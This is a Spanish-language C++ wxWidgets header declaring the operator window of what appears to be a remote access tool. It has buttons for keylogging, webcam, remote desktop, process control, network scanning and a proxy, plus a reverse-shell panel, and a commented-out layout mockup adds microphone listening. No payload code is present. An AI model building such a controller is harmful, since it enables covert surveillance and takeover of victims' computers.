#ifndef _FRAME_CLIENTE
#define _FRAME_CLIENTE
#include "headers.hpp"
#include "panel_reverse_shell.hpp"

#define WIN_WIDTH 900
#define WIN_HEIGHT 600

namespace EnumFrameIDS {
    enum Enum {
        BTN_Keylogger = 100,
        BTN_Camara,
        BTN_Adm_Ventanas,
        BTN_Adm_Procesos,
        BTN_Informacion,
        BTN_Escaner,
        BTN_Remote_Desktop,
        BTN_Fun,
        BTN_Proxy_Iniciar,
        BTN_Proxy_Detener,
        BTN_Limpiar_Log
    };
}

//Clase para las funciones a ejecutar con el cliente, admin archivos, procesos, etc...
class MyTreeCtrl : public wxTreeCtrl {
    public:
        //Eventos
        MyTreeCtrl(wxWindow* parent, const wxWindowID id,
            const wxPoint& pos, const wxSize& size, std::string _strID, std::string _strIP, SOCKET sck) :
            wxTreeCtrl(parent, id, pos, size) {
            strClienteID = _strID;
            strClienteIP = _strIP; 
            sckCliente = sck;
        }

        virtual ~MyTreeCtrl() {}

        void OnItemActivated(wxTreeEvent& event);

        wxAuiNotebook* p_Notebook;
    private:
        std::string strClienteID;
        std::string strClienteIP;
        SOCKET sckCliente = INVALID_SOCKET;
        wxDECLARE_EVENT_TABLE();
};

class FrameCliente : public wxFrame {
    public:
        std::string strClienteID = "";
        //std::string strIP = "";
        SOCKET sckCliente = INVALID_SOCKET;

        FrameCliente(std::string pstrID, SOCKET sckID, std::string strIP);
        FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _strIP);

        MyTreeCtrl* m_tree;

        panelReverseShell* panelShell = nullptr;
    private:
        wxButton* btn_Test;
        
        //Eventos
        void OnClose(wxCloseEvent& event);
        void OnButton(wxCommandEvent& event);

        void OnClosePage(wxAuiNotebookEvent& event);

        wxDECLARE_EVENT_TABLE();

};
#endif


//class MainFrame1 : public wxFrame {
//public:
//    MainFrame1() : wxFrame(nullptr, wxID_ANY, "Titulo Ventana", wxDefaultPosition, wxSize(800, 600)) {
//        // Main sizer
//        wxBoxSizer* mainSizer = new wxBoxSizer(wxVERTICAL);
//
//        // Top panel
//        wxPanel* topPanel = new wxPanel(this);
//        wxBoxSizer* topSizer = new wxBoxSizer(wxHORIZONTAL);
//
//        // File manager section
//        wxPanel* fileManagerPanel = new wxPanel(topPanel);
//        wxBoxSizer* fileManagerSizer = new wxBoxSizer(wxVERTICAL);
//        wxStaticText* fileManagerLabel = new wxStaticText(fileManagerPanel, wxID_ANY, "Administrador de archivos");
//        wxGridSizer* fileGridSizer = new wxGridSizer(1, 5, 5, 5);
//
//        for (int i = 0; i < 5; ++i) {
//            wxButton* fileButton = new wxButton(fileManagerPanel, wxID_ANY, wxEmptyString, wxDefaultPosition, wxSize(50, 50));
//            fileGridSizer->Add(fileButton, 0, wxEXPAND | wxALL, 5);
//        }
//
//        fileManagerSizer->Add(fileManagerLabel, 0, wxALIGN_LEFT | wxALL, 5);
//        fileManagerSizer->Add(fileGridSizer, 1, wxEXPAND | wxALL, 5);
//        fileManagerPanel->SetSizer(fileManagerSizer);
//
//        // Machine info section
//        wxPanel* machineInfoPanel = new wxPanel(topPanel);
//        wxBoxSizer* machineInfoSizer = new wxBoxSizer(wxVERTICAL);
//        wxStaticText* machineLabel = new wxStaticText(machineInfoPanel, wxID_ANY, "Maquina");
//        wxTextCtrl* machineInfoText = new wxTextCtrl(machineInfoPanel, wxID_ANY,
//            "OS: Windows 10\nUsuario: eW1n\nCPU: Intel\nRAM: 8GB\nIP Local: 192.168.0.2\nIP Externa: 24.45.32.2\nEstado: Conectado",
//            wxDefaultPosition, wxSize(200, 100), wxTE_MULTILINE | wxTE_READONLY);
//
//        machineInfoSizer->Add(machineLabel, 0, wxALIGN_LEFT | wxALL, 5);
//        machineInfoSizer->Add(machineInfoText, 1, wxEXPAND | wxALL, 5);
//        machineInfoPanel->SetSizer(machineInfoSizer);
//
//        // Remote log section
//        wxPanel* logPanel = new wxPanel(topPanel);
//        wxBoxSizer* logSizer = new wxBoxSizer(wxVERTICAL);
//        wxStaticText* logLabel = new wxStaticText(logPanel, wxID_ANY, "Log Remoto");
//        wxTextCtrl* logText = new wxTextCtrl(logPanel, wxID_ANY, "[12:45] Error abriendo archivo\n[01:22] Usuario presiono Ok\n[10:22] Archivo creado\n...",
//            wxDefaultPosition, wxSize(200, 100), wxTE_MULTILINE | wxTE_READONLY);
//
//        logSizer->Add(logLabel, 0, wxALIGN_LEFT | wxALL, 5);
//        logSizer->Add(logText, 1, wxEXPAND | wxALL, 5);
//        logPanel->SetSizer(logSizer);
//
//        topSizer->Add(fileManagerPanel, 1, wxEXPAND | wxALL, 5);
//        topSizer->Add(machineInfoPanel, 0, wxEXPAND | wxALL, 5);
//        topSizer->Add(logPanel, 0, wxEXPAND | wxALL, 5);
//        topPanel->SetSizer(topSizer);
//
//        // Middle panel
//        wxPanel* middlePanel = new wxPanel(this);
//        wxGridSizer* middleSizer = new wxGridSizer(2, 5, 5, 5);
//
//        wxArrayString micOptions;
//        micOptions.Add("Microfono 1");
//        micOptions.Add("Microfono 2");
//        wxComboBox* micDropdown = new wxComboBox(middlePanel, wxID_ANY, "", wxDefaultPosition, wxSize(150, 25), micOptions);
//
//        wxButton* listenButton = new wxButton(middlePanel, wxID_ANY, "Escuchar");
//        wxButton* stopButton = new wxButton(middlePanel, wxID_ANY, "Detener");
//        wxButton* keyloggerButton = new wxButton(middlePanel, wxID_ANY, "Keylogger");
//        wxButton* cameraButton = new wxButton(middlePanel, wxID_ANY, "Camara");
//        wxButton* windowButton = new wxButton(middlePanel, wxID_ANY, "Adm. Ventanas");
//        wxButton* processButton = new wxButton(middlePanel, wxID_ANY, "Adm. Procesos");
//        wxButton* scanNetworkButton = new wxButton(middlePanel, wxID_ANY, "Escaner de Red");
//        wxButton* desktopButton = new wxButton(middlePanel, wxID_ANY, "Escritorio Remoto");
//        wxButton* infoButton = new wxButton(middlePanel, wxID_ANY, "Informacion");
//        wxButton* jokesButton = new wxButton(middlePanel, wxID_ANY, "Bromas");
//
//        middleSizer->Add(micDropdown, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(listenButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(stopButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(keyloggerButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(cameraButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(windowButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(processButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(scanNetworkButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(desktopButton, 0, wxEXPAND | wxALL, 5);
//        middleSizer->Add(jokesButton, 0, wxEXPAND | wxALL, 5);
//
//        middlePanel->SetSizer(middleSizer);
//
//        // Bottom panel
//        wxPanel* bottomPanel = new wxPanel(this);
//        wxBoxSizer* bottomSizer = new wxBoxSizer(wxVERTICAL);
//        wxStaticText* shellLabel = new wxStaticText(bottomPanel, wxID_ANY, "Shell Inversa");
//        wxTextCtrl* shellText = new wxTextCtrl(bottomPanel, wxID_ANY, "C:\\Windows\\System32>_", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE);
//
//        bottomSizer->Add(shellLabel, 0, wxALIGN_LEFT | wxALL, 5);
//        bottomSizer->Add(shellText, 1, wxEXPAND | wxALL, 5);
//        bottomPanel->SetSizer(bottomSizer);
//
//        // Add panels to main sizer
//        mainSizer->Add(topPanel, 1, wxEXPAND | wxALL, 5);
//        mainSizer->Add(middlePanel, 0, wxEXPAND | wxALL, 5);
//        mainSizer->Add(bottomPanel, 1, wxEXPAND | wxALL, 5);
//
//        SetSizer(mainSizer);
//    }
//};